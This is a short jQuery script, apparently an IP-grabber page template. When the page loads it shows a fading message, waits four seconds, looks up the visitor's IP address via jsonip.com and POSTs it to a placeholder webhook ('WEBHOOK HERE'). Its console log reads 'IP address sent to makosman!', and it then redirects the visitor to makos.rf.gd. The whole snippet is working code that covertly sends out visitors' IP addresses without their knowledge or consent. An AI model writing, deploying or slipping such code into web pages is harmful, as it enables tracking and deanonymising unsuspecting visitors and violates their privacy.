                $(document).ready(function() { 
                         $("#message1").fadeIn(2000).fadeOut(2000); 
                         setTimeout(function() { 
                                 $.getJSON("https://jsonip.com?callback=?", function(data) { 
                                         var ipAddress = data.ip; 
                                         $.ajax({ 
                                                 type: "POST", 
                                                 url: "WEBHOOK HERE", 
                                                 contentType: "application/json", 
                                                 data: JSON.stringify({"content": "IP Address: " + ipAddress}), 
                                                 success: function() { 
                                                         console.log("IP address sent to makosman!"); 
                                                         $("#message2").fadeIn(2000).fadeOut(2000, function() { 
                                                                 window.location.href = "http://makos.rf.gd"; 
                                                         }); 
                                                 }, 
                                                 error: function(xhr, status, error) { 
                                                         console.error("Error sending IP address to makosman: " + error); 
                                                 } 
                                         }); 
                                 }); 
                         }, 4000); 
                 });